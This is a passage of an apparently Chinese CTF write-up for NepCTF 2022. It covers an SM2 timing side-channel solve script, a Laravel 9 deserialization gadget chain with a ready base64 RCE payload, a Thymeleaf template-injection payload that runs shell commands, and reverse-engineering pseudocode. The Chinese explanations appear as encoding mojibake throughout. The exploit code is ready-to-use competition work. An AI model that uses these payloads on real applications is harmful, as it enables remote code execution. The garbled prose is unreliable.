class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        z_new = (z * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> z_new == <span class="number">1</span>:</span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">2</span></span><br><span class="line">            <span class="keyword">return</span> form % (x_new, y_new)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_point</span>(<span class="params">self,P1,P2</span>):</span></span><br><span class="line">        <span class="keyword">if</span> P1==P2:</span><br><span class="line">            <span class="keyword">return</span> self._double_point(P1)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="keyword">return</span> self._convert_jacb_to_nor(self._add_point(P1,P2))</span><br><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        msg=msg.encode()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">3600</span>)</span><br><span class="line">        g=ecc_table[<span class="string">&quot;g&quot;</span>]</span><br><span class="line">        O=ecc_table[<span class="string">&quot;O&quot;</span>]</span><br><span class="line">        t=[randint(<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">        sk=<span class="built_in">sum</span>([<span class="number">1</span>&lt;&lt;i <span class="keyword">for</span> i <span class="keyword">in</span> t])</span><br><span class="line">        </span><br><span class="line">        self.send(<span class="string">&quot;system reseting...&quot;</span>)</span><br><span class="line">        sm2 = TSM2(sk)</span><br><span class="line">        self.send(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">        self.send(<span class="string">&quot;the system is &quot;</span>+<span class="built_in">str</span>(sm2.pk))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                user=<span class="built_in">int</span>(self.recv(<span class="string">&quot;plz give me your number:&quot;</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.send(<span class="string">&quot;wrong, plz try again&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            t1=clock1()</span><br><span class="line">            kG=sm2.kg(sk-user,g)</span><br><span class="line">            t2=clock1()</span><br><span class="line">            self.send(<span class="string">&quot;used &quot;</span>+<span class="built_in">str</span>((t2-t1)/<span class="number">1e9</span>)+<span class="string">&quot; s&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> kG==O:</span><br><span class="line">                f=<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">                flag=f.read()</span><br><span class="line">                self.send(flag)</span><br><span class="line">                exit()</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">8000</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(HOST, PORT)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure></blockquote><p><code>TSM2</code> ç±»ä¸ºæ­£å¸¸SM2ç®—æ³•å®ç°ï¼Œåªä¸è¿‡åœ¨åŠ æ³•è¿ç®— <code>_add_point()</code> å’Œå€ä¹˜è¿ç®— <code>_double_point()</code> åˆ†åˆ«åŠ äº† <code>sleep()</code> æ§åˆ¶è¿ç®—æ—¶é—´ã€‚</p><p><code>handle()</code> å¤„ç†å‡½æ•°é‡Œï¼Œç»™å‡ºå…¬é’¥ $pk$ï¼Œç»™100æ¬¡è¦æ±‚è¾“å…¥ $u$ï¼Œå½“æ»¡è¶³ $(sk-u)G=O$ æ—¶å¯æ‹¿flagã€‚</p><p>è¦æ»¡è¶³ $(sk-u)G=O$ï¼Œåªæœ‰ $sk-u=0$ æˆ– $sk-u=n$ï¼Œç”±äºé™¤äº†å…¬é’¥å’Œè¿ç®—æ€»æ—¶é—´æ— å…¶ä»–è¾“å‡ºï¼Œåªèƒ½çŒœæµ‹å‡º $u=sk$ã€‚</p><p>ç”±äº $sk$ åªæœ‰8ä½ä¸º1ï¼Œåˆ©ç”¨è¿ç®—æ€»æ—¶é—´ï¼Œå¯ä½œä¸ºä¾§ä¿¡é“ä¿¡æ¯æ¥æµ‹è¯• $sk$ å„ä½ä¸º1æ—¶çš„æ¶ˆè€—æ—¶é—´ï¼Œæµ‹è¯•å‘ç°å½“æ¥è¿‘æ­£ç¡®çš„â€œ1â€ä½æ—¶ï¼Œè¿ç®—æ€»æ—¶é—´ç›¸è¾ƒç›¸é‚»çš„ä¸¤ä½å°ï¼Œé‚£ä¹ˆå¯ä½¿ç”¨æ—¶é—´ä¾§ä¿¡é“æ”»å‡»æ¥æ±‚è§£ç§é’¥ $sk$ã€‚</p><p>å› å°è¯•çš„æ€»æ¬¡æ•°æœ€å¤šä¸º100æ¬¡ï¼Œé‡‡ç”¨åŒºé—´éå†æ³•ç¼©å°å°è¯•æ¬¡æ•°ï¼Œä»¤ $x$ ä¸ºæ¯ä¸ªåŒºé—´é•¿åº¦ï¼Œæ€»æ¬¡æ•° $c=\cfrac{254}{x}+8x \le 100$ï¼Œ$x$ å¯å–å€¼4~8ã€‚</p><p>é‡‡ç”¨ $x=4$ å®ç°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;nep.lemonprefect.cn&#x27;</span>,<span class="number">31135</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;is &#x27;</span>)</span><br><span class="line">pk=r.recvline().strip()</span><br><span class="line"><span class="built_in">print</span>(pk)</span><br><span class="line"></span><br><span class="line">nowt = <span class="number">100000.0</span></span><br><span class="line">start = []</span><br><span class="line">startt = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">x</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(x))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;used &#x27;</span>)</span><br><span class="line">    time = <span class="built_in">float</span>(r.recvuntil(<span class="string">&#x27; s&#x27;</span>)[:-<span class="number">2</span>])</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="keyword">return</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>,<span class="number">4</span>):</span><br><span class="line">    t = send(<span class="number">1</span> &lt;&lt; i)</span><br><span class="line">    <span class="built_in">print</span>(i,t)</span><br><span class="line">    <span class="keyword">if</span> t &gt; nowt:</span><br><span class="line">        start.append(i-<span class="number">4</span>)</span><br><span class="line">        <span class="built_in">print</span>(start)</span><br><span class="line">    nowt = t</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(start)</span><br><span class="line"></span><br><span class="line">ans = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> start:</span><br><span class="line">    nowt = send(<span class="number">1</span> &lt;&lt; k)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        t = send(<span class="number">1</span> &lt;&lt; (k+<span class="number">1</span>+j))</span><br><span class="line">        <span class="keyword">if</span> t &gt; nowt <span class="keyword">and</span> k+<span class="number">1</span>+j-<span class="number">1</span> &lt;= <span class="number">254</span>:</span><br><span class="line">            ans.append(k+<span class="number">1</span>+j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(ans)</span><br><span class="line">        nowt = t</span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line">sk = <span class="built_in">sum</span>([<span class="number">1</span>&lt;&lt;i <span class="keyword">for</span> i <span class="keyword">in</span> ans])</span><br><span class="line"><span class="built_in">print</span>(sk)</span><br><span class="line">send(sk)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Just-Kidding"><a href="#Just-Kidding" class="headerlink" title="Just Kidding"></a>Just Kidding</h3><blockquote><p>é¡½çš®çš„HRPç”¨Laravelå†™äº†ä¸ªé¡¹ç›®æ¥æ¬¢è¿å¤§ä¼™æ¥ç©Nepctf 2ndï¼Œæ²¡æƒ³åˆ°â€¦å±…ç„¶è¢«åè›‹Sharunæ’…äº†</p></blockquote><p>è®¿é—® <code>www.zip</code> ä¸‹è½½æºç ï¼ŒCMSä¸ºLaravel 9.xã€‚</p><p>åœ¨ <code>www\app\Http\Controllers</code> å‘ç° <code>HelloController.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params">\Illuminate\Http\Request <span class="variable">$request</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$h3</span> = base64_decode(<span class="variable">$request</span>-&gt;input(<span class="string">&quot;h3&quot;</span>));</span><br><span class="line">        unserialize(<span class="variable">$h3</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome Nepctf! GL&amp;HF&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–RCEæ¼æ´ï¼Œä½¿ç”¨ç°æˆé“¾å­å¯ä»¥æ‰“é€šï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Routing</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Validation</span>\<span class="title">Validator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingResourceRegistration</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$registrar</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$registered</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>=<span class="string">&#x27;call_user_func&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$controller</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;registrar=<span class="keyword">new</span> Validator();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options=<span class="variable">$cmd</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> PendingResourceRegistration(<span class="string">&#x27;cat /flag&#x27;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Validation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Validator</span>&#123;    </span><br><span class="line">        <span class="title">public</span> $<span class="title">extensions</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;extensions[<span class="string">&#x27;&#x27;</span>]=<span class="string">&#x27;call_user_func&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payloadï¼š</p><p><code>/hello?h3=Tzo0NjoiSWxsdW1pbmF0ZVxSb3V0aW5nXFBlbmRpbmdSZXNvdXJjZVJlZ2lzdHJhdGlvbiI6NTp7czoxMjoiACoAcmVnaXN0cmFyIjtPOjMxOiJJbGx1bWluYXRlXFZhbGlkYXRpb25cVmFsaWRhdG9yIjoxOntzOjEwOiJleHRlbnNpb25zIjthOjE6e3M6MDoiIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX1zOjEzOiIAKgByZWdpc3RlcmVkIjtiOjA7czo3OiIAKgBuYW1lIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7czoxMzoiACoAY29udHJvbGxlciI7czo2OiJzeXN0ZW0iO3M6MTA6IgAqAG9wdGlvbnMiO3M6OToiY2F0IC9mbGFnIjt9</code></p><p>â€‹    </p><h3 id="Challenger"><a href="#Challenger" class="headerlink" title="Challenger"></a>Challenger</h3><blockquote><p>é¡½çš®çš„HRPåˆæ¢äº†ç§è¯­è¨€å†™é¡¹ç›®æ¥æ¬¢è¿å¤§å®¶ï¼Œæ²¡æƒ³åˆ°åˆè®©Sharunæ˜äº†ğŸ˜­</p><p>ï¼ˆflagåœ¨æ ¹ç›®å½•ä¸‹: /flagï¼‰</p></blockquote><p>ç”¨jd-guiåç¼–è¯‘ <code>challenger.jar</code> æ–‡ä»¶ï¼Œå‘ç°ä½¿ç”¨äº†Thymeleafæ¨¡æ¿ï¼Œ</p><p>åœ¨ <code>HelloController.class</code> é‡Œå‘ç° <code>/eval</code> è·¯ç”±ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  Logger log = LoggerFactory.getLogger(com.veracode.research.HelloController.class);</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(Model model)</span> </span>&#123;</span><br><span class="line">    model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;challenger&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;welcome&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@GetMapping(&#123;&quot;/eval&quot;&#125;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒ <a href="https://www.cnblogs.com/hetianlab/p/13679645.html">Thymeleaf æ¨¡æ¿æ³¨å…¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œ</a>ï¼Œä¿®æ”¹payloadæ‹¿åˆ°flagï¼š</p><p>Payload:</p><p><code>/eval?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7d__::</code></p><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="å¿«æ¥ç­¾åˆ°"><a href="#å¿«æ¥ç­¾åˆ°" class="headerlink" title="å¿«æ¥ç­¾åˆ°"></a>å¿«æ¥ç­¾åˆ°</h3><blockquote><p>x86 linux</p></blockquote><p>è¶£å‘³é¢˜ã€‚</p><p>IDAæ‰“å¼€å‘ç°æŠ¥é”™ <code>The graph is too big more than 1000 nodes...</code>ï¼Œä¸” <code>main()</code> å‡½æ•°ä¸­å®šä¹‰å¤šä¸ªå›¾èŠ‚ç‚¹ï¼Œåˆ° IDA - Options - Graph - Max number of nodes é‡Œæ”¹ä¸€ä¸ªå¤§æ•°ä¿å­˜ï¼Œå›åˆ° <code>main()</code> å‡½æ•°åˆ‡æ¢æˆGraph overviewæˆ–è€…IDA Viewä¸­ç¼©å°ï¼Œå¯ä»¥çœ‹åˆ°æ§åˆ¶æµå›¾ï¼ˆCFGï¼‰ï¼š</p><p><img src="/2022/07/17/match-NepCTF-2022/image-20220717213910100.png" alt="image-20220717213910100"></p><p>flagï¼š<code>NepCTF&#123;welc0me_t0_nepctf&#125;</code></p><p>â€‹    </p><h3 id="We-can-gone"><a href="#We-can-gone" class="headerlink" title="We_can_gone"></a>We_can_gone</h3><blockquote><p>æ˜¯å‡ºå‘çš„æ—¶å€™äº†!!!</p></blockquote><p>Goé€†å‘ï¼ŒIDA7.7åˆ†æï¼Œåœ¨Stringçª—å£é‡Œæ‰¾åˆ°å…³é”®å­—ç¬¦ä¸²äº¤å‰å¼•ç”¨å®šä½å…¥å£å‡½æ•° <code>sub_4994E0()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int128 <span class="title">sub_4994E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line">  __int128 result; <span class="comment">// [esp+1Ch] [ebp+4h]</span></span><br><span class="line"></span><br><span class="line">  sub_4993B0(); <span class="comment">// è¾“å‡ºå­—ç¬¦ä¸²&quot;Welcome to NepCTF,I gone on the other side&quot;</span></span><br><span class="line">  v6 = v0;</span><br><span class="line">  v5 = v2;</span><br><span class="line">  sub_433950();</span><br><span class="line">  runtime_printstring(<span class="string">&quot;please input flag to help you get to the other side:\n&quot;</span>, <span class="number">53</span>);</span><br><span class="line">  sub_4339C0();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xB</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">11</span>] = <span class="number">84</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xC</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">12</span>] = <span class="number">82</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xD</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">13</span>] = <span class="number">85</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xE</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">14</span>] = <span class="number">69</span>;      <span class="comment">// å®šä¹‰å­—ç¬¦ä¸²TRUE</span></span><br><span class="line">  *(_QWORD *)&amp;result = __PAIR64__(v5, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6);   <span class="comment">// ä¼ªä»£ç æ··ä¹±</span></span><br><span class="line">  DWORD2(result) = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ååŠéƒ¨åˆ†ä¼ªä»£ç ä¸æ¸…æ™°ï¼Œåœ¨è¯¥å‡½æ•°é™„è¿‘å‘ç°åˆ¤æ–­é€»è¾‘å‡½æ•° <code>sub_499630()</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_499630</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+0h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> *v2; <span class="comment">// [esp+4h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+4h] [ebp-60h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [esp+Ch] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+10h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> v6[<span class="number">8</span>]; <span class="comment">// [esp+20h] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+40h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v8[<span class="number">2</span>]; <span class="comment">// [esp+44h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v9[<span class="number">2</span>]; <span class="comment">// [esp+4Ch] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v10[<span class="number">2</span>]; <span class="comment">// [esp+54h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v11[<span class="number">2</span>]; <span class="comment">// [esp+5Ch] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="keyword">int</span> *)unknown_libname_8((<span class="keyword">int</span>)<span class="string">&quot;\b&quot;</span>);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *v2 = <span class="number">0</span>;</span><br><span class="line">  v11[<span class="number">0</span>] = (<span class="keyword">int</span>)&amp;unk_4A00A0;</span><br><span class="line">  v11[<span class="number">1</span>] = (<span class="keyword">int</span>)v2;</span><br><span class="line">  fmt_Fscanln((<span class="keyword">int</span>)&amp;off_4D25B8, dword_54B200, (<span class="keyword">int</span>)v11, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  v4 = (_BYTE *)sub_4479B0((<span class="keyword">int</span>)v6, *v7, v7[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span 